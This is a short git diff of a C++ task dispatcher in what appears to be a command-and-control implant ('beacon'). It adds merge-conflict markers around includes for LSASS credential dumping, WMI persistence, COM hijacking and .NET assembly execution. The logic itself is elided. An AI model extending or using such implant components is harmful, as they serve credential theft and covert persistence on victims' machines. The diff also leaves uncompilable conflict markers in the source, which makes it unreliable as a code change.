@@ -14,10 +14,13 @@
 #include "../fs/FileSystem.h"
 #include "../recon/DeepRecon.h"
 #include "../crypto/Base64.h"
+<<<<<<< HEAD
 #include "../execution/DotNetExecutor.h"
 #include "../persistence/WmiPersistence.h"
 #include "../persistence/ComHijacker.h"
 #include "../credential/LsassDumper.h"
+=======
+>>>>>>> 68f7affb5880fa8c91159abe3758b8e0be161009
 #include <stdexcept>
 
 namespace beacon {
@@ -186,6 +189,7 @@ void TaskDispatcher::dispatch(const Task& task) {
                 }
                 break;
             }
+<<<<<<< HEAD
             case TaskType::EXECUTE_ASSEMBLY: {
                 // ... (previous logic)
                 break;
@@ -223,6 +227,8 @@ void TaskDispatcher::dispatch(const Task& task) {
                 }
                 break;
             }
+=======
+>>>>>>> 68f7affb5880fa8c91159abe3758b8e0be161009
             // Add other task types here as they are implemented
             default:
                 result.error = "Unknown or unsupported task type.";
